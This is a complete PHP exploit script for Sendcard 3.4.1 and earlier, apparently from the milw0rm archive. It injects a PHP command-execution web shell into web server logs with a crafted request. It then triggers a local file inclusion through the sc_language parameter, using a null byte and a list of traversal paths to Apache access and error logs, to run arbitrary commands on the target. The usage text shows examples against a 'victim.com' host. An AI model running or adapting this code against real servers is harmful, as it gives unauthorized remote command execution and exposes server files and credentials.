#!/usr/bin/php -q -d short_open_tag=on
<?php

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

if ($argc<4) {
print "-------------------------------------------------------------------------\r\n";
print "             Sendcard <= 3.4.1 Remote Code Execution Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "Usage: w4ck1ng_sendcard.php [HOST] [PATH] [COMMAND]\r\n\r\n";
print "[HOST] 	  = Target server's hostname or ip address\r\n";
print "[PATH] 	  = Path where Sendcard is located\r\n";
print "[COMMAND] = Command to execute\r\n\r\n";
print "e.g. w4ck1ng_sendcard.php victim.com /sendcard/ \"ls -lia\"\r\n";
print "     w4ck1ng_sendcard.php victim.com /sendcard/ \"cat sendcard_setup.php\"\r\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
die;
}

//Props to rgod for the following functions

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$cmd="";$port=80;$proxy="";

for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$code="<?php echo w4ckw4ck;error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()){\$_GET[cmd]=stripslashes(\$_GET[cmd]);}passthru(\$_GET[cmd]);die;?>";
$packet="GET " . $p . $code . " HTTP/1.0\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
$packet.="Host: " . $host . "\r\n";
$packet.="Connection: close\r\n\r\n";

sendpacketii($packet);
sleep(3);

$paths= array (
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../etc/httpd/logs/error.log",
"../../../../../var/www/logs/access_log",
"../../../../../var/www/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/access_log",
"../../../../../var/www/logs/error_log",
"../../../../../var/www/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/access_log",
"../../../../../var/log/error_log"
);

for ($i=0; $i<=count($paths)-1; $i++)
{
$a=$i+2;

$packet ="GET " . $p . "sendcard.php?sc_language=" . $paths[$i] . "%00&cmd=" . $cmd . " HTTP/1.1\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
$packet.="Host: " . $host . "\r\n"; 
$packet.="Connection: Close\r\n\r\n";

sendpacketii($packet);

if (strstr($html,"w4ckw4ck"))
    {
     $temp=explode("w4ckw4ck",$html);
	print "-------------------------------------------------------------------------\r\n";
	print "             Sendcard <= 3.4.1 Remote Code Execution Exploit\r\n";
	print "-------------------------------------------------------------------------\r\n";
        echo $temp[1];
	print "-------------------------------------------------------------------------\r\n";
	print "            		 http://www.w4ck1ng.com\r\n";
	print "            		        ...Silentz\r\n";
	print "-------------------------------------------------------------------------\r\n";
	exit;
    }
}

	print "-------------------------------------------------------------------------\r\n";
	print "             Sendcard <= 3.4.1 Remote Code Execution Exploit\r\n";
	print "-------------------------------------------------------------------------\r\n";
        echo "[-] Exploit Failed...\r\n";
	print "-------------------------------------------------------------------------\r\n";
	print "            		 http://www.w4ck1ng.com\r\n";
	print "            		        ...Silentz\r\n";
	print "-------------------------------------------------------------------------\r\n";

?>

# milw0rm.com [2007-06-04]
